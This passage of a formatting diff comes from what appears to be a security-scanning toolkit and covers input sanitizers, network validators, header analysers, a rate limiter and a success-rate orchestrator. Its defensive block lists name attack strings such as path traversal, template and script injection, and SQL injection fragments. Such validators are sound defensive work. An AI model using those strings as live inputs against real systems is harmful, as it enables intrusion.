netloc\n-            if not parsed.netloc or '..' in parsed.netloc:\n+            if not parsed.netloc or \"..\" in parsed.netloc:\n                 return None\n-            \n+\n             # Reconstruct URL safely\n             sanitized = f\"{parsed.scheme}://{parsed.netloc}\"\n-            \n+\n             if parsed.path:\n                 # Sanitize path\n-                path_parts = [quote(part, safe='') for part in parsed.path.split('/')]\n-                sanitized += '/' + '/'.join(path_parts)\n-            \n+                path_parts = [quote(part, safe=\"\") for part in parsed.path.split(\"/\")]\n+                sanitized += \"/\" + \"/\".join(path_parts)\n+\n             if parsed.query:\n                 # Sanitize query parameters\n-                sanitized += '?' + quote(parsed.query, safe='&=')\n-            \n+                sanitized += \"?\" + quote(parsed.query, safe=\"&=\")\n+\n             return sanitized\n-            \n+\n         except Exception:\n             return None\n-    \n+\n     @classmethod\n     def sanitize_domain(cls, domain: str) -> Optional[str]:\n         \"\"\"\n         Sanitize domain name input\n-        \n+\n         Args:\n             domain: Domain to sanitize\n-            \n+\n         Returns:\n             Sanitized domain or None if invalid\n         \"\"\"\n         if not domain or len(domain) > 255:\n             return None\n-        \n+\n         # Remove whitespace and convert to lowercase\n         domain = domain.strip().lower()\n-        \n+\n         # Check for dangerous patterns\n         for pattern in cls.DANGEROUS_PATTERNS.values():\n             if pattern.search(domain):\n                 return None\n-        \n+\n         # Validate domain format\n-        if not cls.ALLOWED_CHARS['domain'].match(domain):\n-            return None\n-        \n+        if not cls.ALLOWED_CHARS[\"domain\"].match(domain):\n+            return None\n+\n         # Additional domain-specific validations\n-        if domain.startswith('.') or domain.endswith('.'):\n-            return None\n-        \n-        if '..' in domain:\n-            return None\n-        \n+        if domain.startswith(\".\") or domain.endswith(\".\"):\n+            return None\n+\n+        if \"..\" in domain:\n+            return None\n+\n         # Check if it's a valid domain format\n-        parts = domain.split('.')\n+        parts = domain.split(\".\")\n         if len(parts) < 2:\n             return None\n-        \n+\n         for part in parts:\n             if not part or len(part) > 63:\n                 return None\n-            if part.startswith('-') or part.endswith('-'):\n+            if part.startswith(\"-\") or part.endswith(\"-\"):\n                 return None\n-        \n+\n         return domain\n-    \n+\n     @classmethod\n     def sanitize_filename(cls, filename: str, max_length: int = 255) -> Optional[str]:\n         \"\"\"\n         Sanitize filename input\n-        \n+\n         Args:\n             filename: Filename to sanitize\n             max_length: Maximum filename length\n-            \n+\n         Returns:\n             Sanitized filename or None if invalid\n         \"\"\"\n         if not filename or len(filename) > max_length:\n             return None\n-        \n+\n         # Remove path separators and dangerous characters\n-        filename = re.sub(r'[<>:\"/\\\\|?*\\x00-\\x1f]', '', filename)\n-        \n+        filename = re.sub(r'[<>:\"/\\\\|?*\\x00-\\x1f]', \"\", filename)\n+\n         # Check for reserved Windows names\n         reserved_names = {\n-            'CON', 'PRN', 'AUX', 'NUL', 'COM1', 'COM2', 'COM3', 'COM4',\n-            'COM5', 'COM6', 'COM7', 'COM8', 'COM9', 'LPT1', 'LPT2',\n-            'LPT3', 'LPT4', 'LPT5', 'LPT6', 'LPT7', 'LPT8', 'LPT9'\n+            \"CON\",\n+            \"PRN\",\n+            \"AUX\",\n+            \"NUL\",\n+            \"COM1\",\n+            \"COM2\",\n+            \"COM3\",\n+            \"COM4\",\n+            \"COM5\",\n+            \"COM6\",\n+            \"COM7\",\n+            \"COM8\",\n+            \"COM9\",\n+            \"LPT1\",\n+            \"LPT2\",\n+            \"LPT3\",\n+            \"LPT4\",\n+            \"LPT5\",\n+            \"LPT6\",\n+            \"LPT7\",\n+            \"LPT8\",\n+            \"LPT9\",\n         }\n-        \n-        base_name = filename.split('.')[0].upper()\n+\n+        base_name = filename.split(\".\")[0].upper()\n         if base_name in reserved_names:\n             return None\n-        \n+\n         # Check for dangerous patterns\n         for pattern in cls.DANGEROUS_PATTERNS.values():\n             if pattern.search(filename):\n                 return None\n-        \n+\n         return filename.strip()\n-    \n+\n     @classmethod\n     def sanitize_parameter(cls, param: str, max_length: int = 1000) -> Optional[str]:\n         \"\"\"\n         Sanitize parameter input (query parameters, form data, etc.)\n-        \n+\n         Args:\n             param: Parameter to sanitize\n             max_length: Maximum parameter length\n-            \n+\n         Returns:\n             Sanitized parameter or None if invalid\n         \"\"\"\n         if not param or len(param) > max_length:\n             return None\n-        \n+\n         # Check for dangerous patterns\n         for pattern_name, pattern in cls.DANGEROUS_PATTERNS.items():\n             if pattern.search(param):\n                 return None\n-        \n+\n         # HTML entity decode and re-encode safely\n         try:\n             decoded = html.unescape(param)\n             # Re-encode dangerous characters\n             encoded = html.escape(decoded, quote=True)\n             return encoded\n         except Exception:\n             return None\n-    \n+\n     @classmethod\n     def is_safe_path(cls, path: Union[str, Path]) -> bool:\n         \"\"\"\n         Check if a file path is safe to use\n-        \n+\n         Args:\n             path: Path to validate\n-            \n+\n         Returns:\n             True if path is safe, False otherwise\n         \"\"\"\n         path_str = str(path)\n-        \n+\n         # Check for path traversal\n-        if cls.DANGEROUS_PATTERNS['path_traversal'].search(path_str):\n+        if cls.DANGEROUS_PATTERNS[\"path_traversal\"].search(path_str):\n             return False\n-        \n+\n         # Check for dangerous directories (allow /home/user paths)\n         dangerous_dirs = [\n-            '/etc/', '/bin/', '/sbin/', '/usr/bin/', '/usr/sbin/',\n-            '/root/', '/var/', '/tmp/', '/proc/', '/sys/',\n-            'C:\\\\Windows\\\\', 'C:\\\\Program Files\\\\', 'C:\\\\Users\\\\'\n+            \"/etc/\",\n+            \"/bin/\",\n+            \"/sbin/\",\n+            \"/usr/bin/\",\n+            \"/usr/sbin/\",\n+            \"/root/\",\n+            \"/var/\",\n+            \"/tmp/\",\n+            \"/proc/\",\n+            \"/sys/\",\n+            \"C:\\\\Windows\\\\\",\n+            \"C:\\\\Program Files\\\\\",\n+            \"C:\\\\Users\\\\\",\n         ]\n-        \n+\n         # Allow /home/user/ paths but not other system paths\n-        if path_str.startswith('/home/'):\n+        if path_str.startswith(\"/home/\"):\n             # Allow paths under /home/ but check for traversal\n-            if cls.DANGEROUS_PATTERNS['path_traversal'].search(path_str):\n+            if cls.DANGEROUS_PATTERNS[\"path_traversal\"].search(path_str):\n                 return False\n             return True\n-        \n+\n         for dangerous_dir in dangerous_dirs:\n             if path_str.startswith(dangerous_dir):\n                 return False\n-        \n+\n         return True\n \n \n class NetworkValidator:\n     \"\"\"Network-related validation and security checks\"\"\"\n-    \n+\n     # Private IP ranges (RFC 1918)\n     PRIVATE_RANGES = [\n-        ipaddress.IPv4Network('10.0.0.0/8'),\n-        ipaddress.IPv4Network('172.16.0.0/12'),\n-        ipaddress.IPv4Network('192.168.0.0/16'),\n-        ipaddress.IPv4Network('127.0.0.0/8'),  # Loopback\n+        ipaddress.IPv4Network(\"10.0.0.0/8\"),\n+        ipaddress.IPv4Network(\"172.16.0.0/12\"),\n+        ipaddress.IPv4Network(\"192.168.0.0/16\"),\n+        ipaddress.IPv4Network(\"127.0.0.0/8\"),  # Loopback\n     ]\n-    \n+\n     # Reserved/special use ranges\n     RESERVED_RANGES = [\n-        ipaddress.IPv4Network('0.0.0.0/8'),     # \"This\" network\n-        ipaddress.IPv4Network('169.254.0.0/16'), # Link-local\n-        ipaddress.IPv4Network('224.0.0.0/4'),   # Multicast\n-        ipaddress.IPv4Network('240.0.0.0/4'),   # Reserved\n+        ipaddress.IPv4Network(\"0.0.0.0/8\"),  # \"This\" network\n+        ipaddress.IPv4Network(\"169.254.0.0/16\"),  # Link-local\n+        ipaddress.IPv4Network(\"224.0.0.0/4\"),  # Multicast\n+        ipaddress.IPv4Network(\"240.0.0.0/4\"),  # Reserved\n     ]\n-    \n+\n     @classmethod\n     def validate_target_host(cls, host: str) -> Dict[str, Any]:\n         \"\"\"\n         Validate target host for security testing\n-        \n+\n         Args:\n             host: Hostname or IP address to validate\n-            \n+\n         Returns:\n             Validation result dictionary\n         \"\"\"\n-        result = {\n-            'valid': False,\n-            'type': None,\n-            'warnings': [],\n-            'errors': []\n-        }\n-        \n+        result = {\"valid\": False, \"type\": None, \"warnings\": [], \"errors\": []}\n+\n         # Sanitize input\n         sanitized_host = InputSanitizer.sanitize_domain(host)\n         if not sanitized_host and not cls._is_valid_ip(host):\n-            result['errors'].append('Invalid host format')\n+            result[\"errors\"].append(\"Invalid host format\")\n             return result\n-        \n+\n         # Check if it's an IP address\n         try:\n             ip = ipaddress.IPv4Address(host)\n-            result['type'] = 'ip'\n-            result['ip_address'] = str(ip)\n-            \n+            result[\"type\"] = \"ip\"\n+            result[\"ip_address\"] = str(ip)\n+\n             # Check for private/reserved ranges\n             if cls._is_private_ip(ip):\n-                result['warnings'].append('Target is in private IP range')\n+                result[\"warnings\"].append(\"Target is in private IP range\")\n             elif cls._is_reserved_ip(ip):\n-                result['errors'].append('Target is in reserved IP range')\n+                result[\"errors\"].append(\"Target is in reserved IP range\")\n                 return result\n-                \n+\n         except ipaddress.AddressValueError:\n             # It's a domain name\n-            result['type'] = 'domain'\n-            result['domain'] = sanitized_host or host\n-            \n+            result[\"type\"] = \"domain\"\n+            result[\"domain\"] = sanitized_host or host\n+\n             # Additional domain validation\n-            if not cls._validate_domain_name(result['domain']):\n-                result['errors'].append('Invalid domain name format')\n+            if not cls._validate_domain_name(result[\"domain\"]):\n+                result[\"errors\"].append(\"Invalid domain name format\")\n                 return result\n-        \n+\n         # Check for localhost/internal targets\n         if cls._is_internal_target(host):\n-            result['warnings'].append('Target appears to be internal/localhost')\n-        \n-        result['valid'] = True\n+            result[\"warnings\"].append(\"Target appears to be internal/localhost\")\n+\n+        result[\"valid\"] = True\n         return result\n-    \n+\n     @classmethod\n     def _is_valid_ip(cls, ip_str: str) -> bool:\n         \"\"\"Check if string is a valid IP address\"\"\"\n         try:\n             ipaddress.IPv4Address(ip_str)\n@@ -316,257 +349,284 @@\n             try:\n                 ipaddress.IPv6Address(ip_str)\n                 return True\n             except ipaddress.AddressValueError:\n                 return False\n-    \n+\n     @classmethod\n     def _is_private_ip(cls, ip: ipaddress.IPv4Address) -> bool:\n         \"\"\"Check if IP is in private ranges\"\"\"\n         return any(ip in network for network in cls.PRIVATE_RANGES)\n-    \n+\n     @classmethod\n     def _is_reserved_ip(cls, ip: ipaddress.IPv4Address) -> bool:\n         \"\"\"Check if IP is in reserved ranges\"\"\"\n         return any(ip in network for network in cls.RESERVED_RANGES)\n-    \n+\n     @classmethod\n     def _validate_domain_name(cls, domain: str) -> bool:\n         \"\"\"Validate domain name format\"\"\"\n         if not domain or len(domain) > 255:\n             return False\n-        \n+\n         # Check each label\n-        labels = domain.split('.')\n+        labels = domain.split(\".\")\n         if len(labels) < 2:\n             return False\n-        \n+\n         for label in labels:\n             if not label or len(label) > 63:\n                 return False\n-            if not re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?$', label):\n+            if not re.match(r\"^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?$\", label):\n                 return False\n-        \n+\n         return True\n-    \n+\n     @classmethod\n     def _is_internal_target(cls, host: str) -> bool:\n         \"\"\"Check if target is internal/localhost\"\"\"\n         internal_indicators = [\n-            'localhost', '127.0.0.1', '::1',\n-            '.local', '.internal', '.corp',\n-            'test.', 'dev.', 'staging.'\n+            \"localhost\",\n+            \"127.0.0.1\",\n+            \"::1\",\n+            \".local\",\n+            \".internal\",\n+            \".corp\",\n+            \"test.\",\n+            \"dev.\",\n+            \"staging.\",\n         ]\n-        \n+\n         host_lower = host.lower()\n         return any(indicator in host_lower for indicator in internal_indicators)\n \n \n class SecureHeaders:\n     \"\"\"Security headers validation and recommendations\"\"\"\n-    \n+\n     SECURITY_HEADERS = {\n-        'strict-transport-security': {\n-            'required': True,\n-            'description': 'Enforces secure HTTPS connections'\n-        },\n-        'x-frame-options': {\n-            'required': True,\n-            'description': 'Prevents clickjacking attacks'\n-        },\n-        'x-content-type-options': {\n-            'required': True,\n-            'description': 'Prevents MIME-type sniffing'\n-        },\n-        'content-security-policy': {\n-            'required': True,\n-            'description': 'Prevents XSS and code injection'\n-        },\n-        'x-xss-protection': {\n-            'required': False,\n-            'description': 'Legacy XSS protection (deprecated)'\n-        },\n-        'referrer-policy': {\n-            'required': True,\n-            'description': 'Controls referrer information'\n+        \"strict-transport-security\": {\n+            \"required\": True,\n+            \"description\": \"Enforces secure HTTPS connections\",\n+        },\n+        \"x-frame-options\": {\n+            \"required\": True,\n+            \"description\": \"Prevents clickjacking attacks\",\n+        },\n+        \"x-content-type-options\": {\n+            \"required\": True,\n+            \"description\": \"Prevents MIME-type sniffing\",\n+        },\n+        \"content-security-policy\": {\n+            \"required\": True,\n+            \"description\": \"Prevents XSS and code injection\",\n+        },\n+        \"x-xss-protection\": {\n+            \"required\": False,\n+            \"description\": \"Legacy XSS protection (deprecated)\",\n+        },\n+        \"referrer-policy\": {\n+            \"required\": True,\n+            \"description\": \"Controls referrer information\",\n+        },\n+    }\n+\n+    @classmethod\n+    def analyze_headers(cls, headers: Dict[str, str]) -> Dict[str, Any]:\n+        \"\"\"\n+        Analyze HTTP headers for security issues\n+\n+        Args:\n+            headers: Dictionary of HTTP headers\n+\n+        Returns:\n+            Security analysis results\n+        \"\"\"\n+        result = {\n+            \"score\": 0,\n+            \"max_score\": 0,\n+            \"missing_headers\": [],\n+            \"present_headers\": [],\n+            \"recommendations\": [],\n         }\n-    }\n-    \n-    @classmethod\n-    def analyze_headers(cls, headers: Dict[str, str]) -> Dict[str, Any]:\n-        \"\"\"\n-        Analyze HTTP headers for security issues\n-        \n-        Args:\n-            headers: Dictionary of HTTP headers\n-            \n-        Returns:\n-            Security analysis results\n-        \"\"\"\n-        result = {\n-            'score': 0,\n-            'max_score': 0,\n-            'missing_headers': [],\n-            'present_headers': [],\n-            'recommendations': []\n-        }\n-        \n+\n         headers_lower = {k.lower(): v for k, v in headers.items()}\n-        \n+\n         for header_name, config in cls.SECURITY_HEADERS.items():\n-            result['max_score'] += 1 if config['required'] else 0.5\n-            \n+            result[\"max_score\"] += 1 if config[\"required\"] else 0.5\n+\n             if header_name in headers_lower:\n-                result['present_headers'].append({\n-                    'name': header_name,\n-                    'value': headers_lower[header_name],\n-                    'description': config['description']\n-                })\n-                result['score'] += 1 if config['required'] else 0.5\n+                result[\"present_headers\"].append(\n+                    {\n+                        \"name\": header_name,\n+                        \"value\": headers_lower[header_name],\n+                        \"description\": config[\"description\"],\n+                    }\n+                )\n+                result[\"score\"] += 1 if config[\"required\"] else 0.5\n             else:\n-                result['missing_headers'].append({\n-                    'name': header_name,\n-                    'required': config['required'],\n-                    'description': config['description']\n-                })\n-                \n-                if config['required']:\n-                    result['recommendations'].append(\n+                result[\"missing_headers\"].append(\n+                    {\n+                        \"name\": header_name,\n+                        \"required\": config[\"required\"],\n+                        \"description\": config[\"description\"],\n+                    }\n+                )\n+\n+                if config[\"required\"]:\n+                    result[\"recommendations\"].append(\n                         f\"Add {header_name} header: {config['description']}\"\n                     )\n-        \n+\n         # Calculate percentage score\n-        result['percentage'] = (result['score'] / result['max_score'] * 100) if result['max_score'] > 0 else 0\n-        \n+        result[\"percentage\"] = (\n+            (result[\"score\"] / result[\"max_score\"] * 100)\n+            if result[\"max_score\"] > 0\n+            else 0\n+        )\n+\n         return result\n \n \n class InputValidator:\n     \"\"\"Input validation and sanitization class\"\"\"\n-    \n+\n     @staticmethod\n-    def validate_input(input_value: str, max_length: int = 256, \n-                      pattern: Optional[str] = None, \n-                      forbidden_patterns: Optional[List[str]] = None) -> bool:\n+    def validate_input(\n+        input_value: str,\n+        max_length: int = 256,\n+        pattern: Optional[str] = None,\n+        forbidden_patterns: Optional[List[str]] = None,\n+    ) -> bool:\n         \"\"\"\n         Validate input against various security criteria\n-        \n+\n         Args:\n             input_value: Input to validate\n             max_length: Maximum allowed length\n             pattern: Regex pattern to match (if provided)\n             forbidden_patterns: List of forbidden patterns\n-            \n+\n         Returns:\n             True if valid, False otherwise\n         \"\"\"\n         if not isinstance(input_value, str):\n             return False\n-        \n+\n         if len(input_value) > max_length:\n             return False\n-        \n+\n         # Check forbidden patterns (security)\n         if forbidden_patterns:\n             for forbidden in forbidden_patterns:\n                 if forbidden.lower() in input_value.lower():\n                     return False\n-        \n+\n         # Check for common attack patterns (only dangerous ones)\n         dangerous_patterns = [\n-            '../', '..\\\\', '${', '{{', '<script', 'javascript:', \n-            '; drop', \"'; drop\", 'union select', 'insert into'\n+            \"../\",\n+            \"..\\\\\",\n+            \"${\",\n+            \"{{\",\n+            \"<script\",\n+            \"javascript:\",\n+            \"; drop\",\n+            \"'; drop\",\n+            \"union select\",\n+            \"insert into\",\n         ]\n-        \n+\n         for attack_pattern in dangerous_patterns:\n             if attack_pattern.lower() in input_value.lower():\n                 return False\n-        \n+\n         # Check pattern match if provided\n         if pattern:\n             import re\n+\n             if not re.match(pattern, input_value):\n                 return False\n-        \n+\n         return True\n \n \n class RateLimiter:\n     \"\"\"Rate limiting for security testing to avoid overwhelming targets\"\"\"\n-    \n+\n     def __init__(self, max_requests: int = 10, time_window: float = 1.0):\n         \"\"\"\n         Initialize rate limiter\n-        \n+\n         Args:\n             max_requests: Maximum requests allowed in time window\n             time_window: Time window in seconds\n         \"\"\"\n         import time\n         import collections\n-        \n+\n         self.max_requests = max_requests\n         self.time_window = time_window\n         self.request_times = collections.defaultdict(collections.deque)\n         self.stats = collections.defaultdict(int)\n-    \n+\n     def is_allowed(self, key: str = \"default\") -> bool:\n         \"\"\"\n         Check if request is allowed under rate limit\n-        \n+\n         Args:\n             key: Rate limiter key (allows different limits per key)\n-            \n+\n         Returns:\n             True if allowed, False if rate limited\n         \"\"\"\n         import time\n-        \n+\n         now = time.time()\n         window_start = now - self.time_window\n-        \n+\n         # Clean old requests\n         requests = self.request_times[key]\n         while requests and requests[0] < window_start:\n             requests.popleft()\n-        \n+\n         if len(requests) < self.max_requests:\n             requests.append(now)\n             self.stats[f\"{key}_allowed\"] += 1\n             return True\n-        \n+\n         self.stats[f\"{key}_blocked\"] += 1\n         return False\n-    \n+\n     def get_stats(self) -> Dict[str, Any]:\n         \"\"\"Get rate limiter statistics\"\"\"\n         return dict(self.stats)\n \n \n class NetworkValidator:\n     \"\"\"Network-related validation utilities\"\"\"\n-    \n+\n     @staticmethod\n     def is_private_ip(ip_str: str) -> bool:\n         \"\"\"Check if IP address is in private ranges\"\"\"\n         try:\n             ip = ipaddress.ip_address(ip_str)\n             return ip.is_private\n         except ValueError:\n             return False\n-    \n+\n     @staticmethod\n     def is_valid_domain(domain: str) -> bool:\n         \"\"\"Validate domain name format\"\"\"\n         if not domain or len(domain) > 255:\n             return False\n-        \n+\n         # Basic domain pattern\n         import re\n-        domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?(\\.[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?)*$'\n+\n+        domain_pattern = r\"^[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?(\\.[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?)*$\"\n         return bool(re.match(domain_pattern, domain))\n-    \n+\n     @staticmethod\n     def is_valid_ip(ip_str: str) -> bool:\n         \"\"\"Validate IP address format\"\"\"\n         try:\n             ipaddress.ip_address(ip_str)\n@@ -575,73 +635,93 @@\n             return False\n \n \n class SecurityHeaderAnalyzer:\n     \"\"\"Analyze HTTP security headers\"\"\"\n-    \n+\n     SECURITY_HEADERS = {\n-        'content-security-policy': {'required': True, 'description': 'Prevents XSS and injection attacks'},\n-        'strict-transport-security': {'required': True, 'description': 'Enforces HTTPS connections'},\n-        'x-frame-options': {'required': True, 'description': 'Prevents clickjacking attacks'},\n-        'x-content-type-options': {'required': True, 'description': 'Prevents MIME sniffing attacks'},\n-        'referrer-policy': {'required': False, 'description': 'Controls referrer information'},\n-        'permissions-policy': {'required': False, 'description': 'Controls browser features'}\n+        \"content-security-policy\": {\n+            \"required\": True,\n+            \"description\": \"Prevents XSS and injection attacks\",\n+        },\n+        \"strict-transport-security\": {\n+            \"required\": True,\n+            \"description\": \"Enforces HTTPS connections\",\n+        },\n+        \"x-frame-options\": {\n+            \"required\": True,\n+            \"description\": \"Prevents clickjacking attacks\",\n+        },\n+        \"x-content-type-options\": {\n+            \"required\": True,\n+            \"description\": \"Prevents MIME sniffing attacks\",\n+        },\n+        \"referrer-policy\": {\n+            \"required\": False,\n+            \"description\": \"Controls referrer information\",\n+        },\n+        \"permissions-policy\": {\n+            \"required\": False,\n+            \"description\": \"Controls browser features\",\n+        },\n     }\n-    \n+\n     @classmethod\n     def analyze_headers(cls, headers: Dict[str, str]) -> Dict[str, Any]:\n         \"\"\"Analyze security headers for compliance\"\"\"\n         result = {\n-            'score': 0,\n-            'max_score': 0,\n-            'missing_headers': [],\n-            'present_headers': [],\n-            'recommendations': []\n+            \"score\": 0,\n+            \"max_score\": 0,\n+            \"missing_headers\": [],\n+            \"present_headers\": [],\n+            \"recommendations\": [],\n         }\n-        \n+\n         headers_lower = {k.lower(): v for k, v in headers.items()}\n-        \n+\n         for header_name, config in cls.SECURITY_HEADERS.items():\n-            result['max_score'] += 1 if config['required'] else 0.5\n-            \n+            result[\"max_score\"] += 1 if config[\"required\"] else 0.5\n+\n             if header_name in headers_lower:\n-                result['present_headers'].append(header_name)\n-                result['score'] += 1 if config['required'] else 0.5\n+                result[\"present_headers\"].append(header_name)\n+                result[\"score\"] += 1 if config[\"required\"] else 0.5\n             else:\n-                result['missing_headers'].append(header_name)\n-        \n-        result['percentage'] = (result['score'] / result['max_score'] * 100) if result['max_score'] > 0 else 0\n+                result[\"missing_headers\"].append(header_name)\n+\n+        result[\"percentage\"] = (\n+            (result[\"score\"] / result[\"max_score\"] * 100)\n+            if result[\"max_score\"] > 0\n+            else 0\n+        )\n         return result\n-\n-\n \n \n def create_security_context(operation: str, target: str) -> Dict[str, Any]:\n     \"\"\"\n     Create security context for logging and auditing\n-    \n+\n     Args:\n         operation: Security operation being performed\n         target: Target being tested\n-        \n+\n     Returns:\n         Security context dictionary\n     \"\"\"\n     import datetime\n     import getpass\n     import socket\n-    \n+\n     # Validate inputs\n     operation = InputSanitizer.sanitize_parameter(operation) or \"unknown\"\n     target = InputSanitizer.sanitize_domain(target) or \"unknown\"\n-    \n+\n     context = {\n-        'timestamp': datetime.datetime.now(datetime.timezone.utc).isoformat(),\n-        'operation': operation,\n-        'target': target,\n-        'user': getpass.getuser(),\n-        'hostname': socket.gethostname(),\n-        'authorized': False,  # Must be explicitly set to True\n-        'scope': 'unknown'\n+        \"timestamp\": datetime.datetime.now(datetime.timezone.utc).isoformat(),\n+        \"operation\": operation,\n+        \"target\": target,\n+        \"user\": getpass.getuser(),\n+        \"hostname\": socket.gethostname(),\n+        \"authorized\": False,  # Must be explicitly set to True\n+        \"scope\": \"unknown\",\n     }\n-    \n-    return context\n\\ No newline at end of file\n+\n+    return context\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/success_rate_orchestrator.py\t2025-09-14 19:10:58.580755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/success_rate_orchestrator.py\t2025-09-14 19:23:14.148153+00:00\n@@ -15,285 +15,300 @@\n import logging\n \n # Enhanced modules imports with fallbacks\n try:\n     from enhanced_scanning import adaptive_scan_manager, get_current_success_rate\n+\n     ENHANCED_SCANNING_AVAILABLE = True\n except ImportError:\n     ENHANCED_SCANNING_AVAILABLE = False\n \n try:\n     from enhanced_tool_manager import tool_manager, get_tool_coverage_report\n+\n     ENHANCED_TOOL_MANAGER_AVAILABLE = True\n except ImportError:\n     ENHANCED_TOOL_MANAGER_AVAILABLE = False\n \n try:\n     from enhanced_validation import reliability_tracker, get_system_reliability_score\n+\n     ENHANCED_VALIDATION_AVAILABLE = True\n except ImportError:\n     ENHANCED_VALIDATION_AVAILABLE = False\n \n try:\n     from performance_monitor import performance_monitor, get_current_performance_metrics\n+\n     PERFORMANCE_MONITOR_AVAILABLE = True\n except ImportError:\n     PERFORMANCE_MONITOR_AVAILABLE = False\n \n+\n @dataclass\n class SuccessRateMetrics:\n     \"\"\"Comprehensive success rate metrics\"\"\"\n+\n     overall_success_rate: float = 0.0\n     scanning_success_rate: float = 0.0\n     tool_coverage_percentage: float = 0.0\n     validation_accuracy: float = 0.0\n     system_reliability: float = 0.0\n     performance_score: float = 0.0\n     timestamp: datetime = field(default_factory=datetime.now)\n-    \n+\n     @property\n     def composite_score(self) -> float:\n         \"\"\"Calculate composite success score\"\"\"\n         weights = {\n-            'overall_success_rate': 0.3,\n-            'scanning_success_rate': 0.25,\n-            'tool_coverage_percentage': 0.15,\n-            'validation_accuracy': 0.1,\n-            'system_reliability': 0.1,\n-            'performance_score': 0.1\n+            \"overall_success_rate\": 0.3,\n+            \"scanning_success_rate\": 0.25,\n+            \"tool_coverage_percentage\": 0.15,\n+            \"validation_accuracy\": 0.1,\n+            \"system_reliability\": 0.1,\n+            \"performance_score\": 0.1,\n         }\n-        \n+\n         score = 0.0\n         for metric, weight in weights.items():\n             value = getattr(self, metric, 0.0)\n             score += value * weight\n-        \n+\n         return min(1.0, score)  # Cap at 100%\n+\n \n @dataclass\n class ImprovementAction:\n     \"\"\"Represents an action to improve success rate\"\"\"\n+\n     name: str\n     description: str\n     priority: int  # 1 = highest priority\n     estimated_impact: float  # Expected improvement percentage\n     execution_time: int  # Estimated time in seconds\n     prerequisites: List[str] = field(default_factory=list)\n     executed: bool = False\n     execution_time_actual: Optional[float] = None\n     impact_actual: Optional[float] = None\n \n+\n class SuccessRateOrchestrator:\n     \"\"\"\n     Orchestrates all enhancement systems to achieve and maintain 96%+ success rate\n     \"\"\"\n-    \n+\n     def __init__(self, target_success_rate: float = 0.96):\n         self.target_success_rate = target_success_rate\n         self.current_metrics = SuccessRateMetrics()\n         self.improvement_actions = self._initialize_improvement_actions()\n         self.monitoring_active = False\n         self.monitor_thread: Optional[threading.Thread] = None\n         self.lock = threading.Lock()\n-        \n+\n         # Historical tracking\n         self.metrics_history: List[SuccessRateMetrics] = []\n         self.actions_executed: List[ImprovementAction] = []\n-        \n+\n         # Auto-improvement settings\n         self.auto_improvement_enabled = True\n         self.last_improvement_time = datetime.now()\n         self.improvement_cooldown = timedelta(minutes=10)\n-        \n+\n     def _initialize_improvement_actions(self) -> List[ImprovementAction]:\n         \"\"\"Initialize available improvement actions\"\"\"\n         return [\n             ImprovementAction(\n                 name=\"install_critical_tools\",\n                 description=\"Install missing critical security tools\",\n                 priority=1,\n                 estimated_impact=0.15,  # 15% improvement\n                 execution_time=300,  # 5 minutes\n-                prerequisites=[\"internet_connection\"]\n+                prerequisites=[\"internet_connection\"],\n             ),\n             ImprovementAction(\n                 name=\"optimize_scan_parameters\",\n                 description=\"Auto-tune scanning parameters for better performance\",\n                 priority=2,\n                 estimated_impact=0.08,\n                 execution_time=30,\n-                prerequisites=[\"enhanced_scanning\"]\n+                prerequisites=[\"enhanced_scanning\"],\n             ),\n             ImprovementAction(\n                 name=\"enable_performance_monitoring\",\n                 description=\"Start real-time performance monitoring\",\n                 priority=1,\n                 estimated_impact=0.05,\n                 execution_time=5,\n-                prerequisites=[\"performance_monitor\"]\n+                prerequisites=[\"performance_monitor\"],\n             ),\n             ImprovementAction(\n                 name=\"update_tool_configurations\",\n                 description=\"Update tool configurations for reliability\",\n                 priority=3,\n                 estimated_impact=0.06,\n                 execution_time=60,\n-                prerequisites=[\"tool_manager\"]\n+                prerequisites=[\"tool_manager\"],\n             ),\n             ImprovementAction(\n                 name=\"enable_adaptive_scanning\",\n                 description=\"Enable adaptive scanning with success tracking\",\n                 priority=2,\n                 estimated_impact=0.10,\n                 execution_time=15,\n-                prerequisites=[\"enhanced_scanning\"]\n+                prerequisites=[\"enhanced_scanning\"],\n             ),\n             ImprovementAction(\n                 name=\"implement_fallback_chains\",\n                 description=\"Implement intelligent fallback chains for failed operations\",\n                 priority=3,\n                 estimated_impact=0.07,\n                 execution_time=45,\n-                prerequisites=[\"tool_manager\", \"enhanced_validation\"]\n+                prerequisites=[\"tool_manager\", \"enhanced_validation\"],\n             ),\n             ImprovementAction(\n                 name=\"optimize_resource_usage\",\n                 description=\"Optimize CPU and memory usage for stability\",\n                 priority=4,\n                 estimated_impact=0.04,\n                 execution_time=20,\n-                prerequisites=[\"performance_monitor\"]\n+                prerequisites=[\"performance_monitor\"],\n             ),\n             ImprovementAction(\n                 name=\"enhance_error_handling\",\n                 description=\"Improve error handling and recovery mechanisms\",\n                 priority=3,\n                 estimated_impact=0.05,\n                 execution_time=30,\n-                prerequisites=[\"enhanced_validation\"]\n-            )\n+                prerequisites=[\"enhanced_validation\"],\n+            ),\n         ]\n-    \n+\n     def start_monitoring(self, interval: float = 30.0):\n         \"\"\"Start continuous success rate monitoring\"\"\"\n         if self.monitoring_active:\n             print(\"\ud83d\udd0d Success rate monitoring already active\")\n             return\n-        \n+\n         self.monitoring_active = True\n         self.monitor_thread = threading.Thread(\n-            target=self._monitoring_loop,\n-            args=(interval,),\n-            daemon=True\n+            target=self._monitoring_loop, args=(interval,), daemon=True\n         )\n         self.monitor_thread.start()\n-        print(f\"\ud83c\udfaf Success rate monitoring started (target: {self.target_success_rate:.1%})\")\n-    \n+        print(\n+            f\"\ud83c\udfaf Success rate monitoring started (target: {self.target_success_rate:.1%})\"\n+        )\n+\n     def stop_monitoring(self):\n         \"\"\"Stop success rate monitoring\"\"\"\n         self.monitoring_active = False\n         if self.monitor_thread:\n             self.monitor_thread.join(timeout=5)\n         print(\"\ud83d\uded1 Success rate monitoring stopped\")\n-    \n+\n     def 